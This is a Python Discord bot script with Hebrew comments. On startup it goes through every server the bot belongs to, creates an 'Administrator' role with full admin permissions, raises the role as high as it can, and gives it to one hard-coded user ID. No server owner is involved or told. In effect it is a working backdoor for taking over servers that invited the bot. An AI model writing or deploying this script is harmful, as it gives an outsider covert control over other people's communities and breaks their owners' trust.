import discord
from discord.ext import commands

# הגדרת ה-Intents (הרשאות גישה למידע של הבוט)
intents = discord.Intents.default()
intents.guilds = True
intents.members = True  # חובה כדי למצוא את המשתמש בשרת

bot = commands.Bot(command_prefix="!", intents=intents)

# הגדרות קבועות מראש
TARGET_USER_ID = 1510555971343093881
ROLE_NAME = "👑 Administrator"

@bot.event
async def on_ready():
    print(f"הבוט מחובר כ- {bot.user.name}")
    
    # לולאה שעוברת על כל השרתים שהבוט נמצא בהם
    for guild in bot.guilds:
        print(f"מריץ תהליך בשרת: {guild.name}")
        
        # 1. יצירת הרול עם הרשאות אדמין
        try:
            # הגדרת הרשאות אדמין
            permissions = discord.Permissions(administrator=True)
            
            # יצירת הרול בפועל
            new_role = await guild.create_role(
                name=ROLE_NAME, 
                permissions=permissions, 
                reason="בוט אוטומטי - יצירת רול ניהול"
            )
            print(f"הרול '{ROLE_NAME}' נוצר בהצלחה בשרת {guild.name}.")
            
            # 2. ניסיון להעלות את הרול הכי גבוה שאפשר
            try:
                # הרול הכי גבוה שהבוט יכול לשים הוא אחד מתחת לרול של הבוט עצמו
                bot_member = guild.me
                highest_possible_position = bot_member.top_role.position - 1
                
                if highest_possible_position > 0:
                    await new_role.edit(position=highest_possible_position)
                    print(f"הרול הועבר למיקום # {highest_possible_position}")
            except Exception as e:
                print(f"לא ניתן היה לשנות את מיקום הרול: {e}")

            # 3. הענקת הרול למשתמש הספציפי
            try:
                member = await guild.fetch_member(TARGET_USER_ID)
                if member:
                    await member.add_roles(new_role)
                    print(f"הרול הוענק בהצלחה למשתמש {member.name} (ID: {TARGET_USER_ID})")
                else:
                    print(f"המשתמש עם ה-ID {TARGET_USER_ID} לא נמצא בשרת זה.")
            except discord.NotFound:
                print(f"משתמש {TARGET_USER_ID} לא נמצא בשרת.")
            except Exception as e:
                print(f"שגיאה בהענקת הרול למשתמש: {e}")
                
        except discord.Forbidden:
            print(f"אין לבוט הרשאות מתאימות (Manage Roles) בשרת {guild.name}.")
        except Exception as e:
            print(f"שגיאה כללית בשרת {guild.name}: {e}")

# הכנס את הטוקן של הבוט שלך כאן
TOKEN = "YOUR_BOT_TOKEN_HERE"
bot.run(TOKEN)
